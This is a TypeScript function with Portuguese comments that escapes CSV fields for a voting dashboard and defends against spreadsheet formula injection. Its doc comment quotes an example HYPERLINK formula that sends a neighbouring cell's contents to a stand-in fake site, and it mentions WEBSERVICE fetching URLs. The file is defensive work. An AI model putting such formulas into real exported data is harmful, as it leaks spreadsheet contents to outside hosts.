/**
 * Escape de campo para CSV, com a proteção que o escape de aspas não dá.
 *
 * **O risco não é quebrar a planilha: é o Excel executar o texto.** Campo que
 * começa com `=`, `+`, `-`, `@`, tabulação ou retorno de carro é lido como
 * fórmula por Excel, LibreOffice e Google Sheets. E os CSV deste painel levam
 * texto que qualquer pessoa digitou no celular, na tela de voto: a observação
 * e o nome de quem atendeu.
 *
 * Uma observação escrita como
 * `=HYPERLINK("https://site-falso/?"&A1,"Resultado do Boteco")` vira link
 * clicável dentro da planilha da ACIA, com o conteúdo da célula vizinha
 * pendurado na URL. `=WEBSERVICE(...)` chega a buscar a URL sozinho no Sheets.
 *
 * A defesa é prefixar com aspa simples, que as três planilhas tratam como
 * "isto é texto" e não mostram na célula. Feito **antes** do escape de aspas,
 * para a aspa simples entrar no conteúdo e não no delimitador.
 */

/** Caracteres que fazem uma planilha tratar a célula como fórmula. */
const INICIO_DE_FORMULA = /^[=+\-@\t\r]/

export function campoCsv(v: unknown): string {
  const bruto = v === null || v === undefined ? '' : String(v)
  const texto = INICIO_DE_FORMULA.test(bruto) ? `'${bruto}` : bruto
  return /[";\n\r]/.test(texto) ? `"${texto.replace(/"/g, '""')}"` : texto
}
